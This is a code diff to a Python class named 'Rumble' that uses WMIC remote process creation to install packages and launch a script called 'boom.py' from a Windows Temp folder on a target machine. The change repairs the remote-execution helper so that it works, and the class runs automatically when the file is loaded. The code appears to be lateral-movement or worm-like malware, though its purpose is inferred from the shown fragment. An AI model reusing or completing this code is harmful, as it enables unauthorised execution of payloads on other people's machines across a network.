@@ -29,9 +29,8 @@ class Rumble:
             self.wmic('pip install -r c:\Windows\Temp\boom\requirements.txt')
             sleep(8)
             self.wmic('python c:\Windows\Temp\boom\boom.py')
-        
-        @classmethod 
-        def wmic(ip, command):
-            system(f'wmic /node:{ip} process call create "{command}"')
+         
+        def wmic(self, command):
+            system(f'wmic /node:{self.ip} process call create "{command}"')
 
 Rumble()
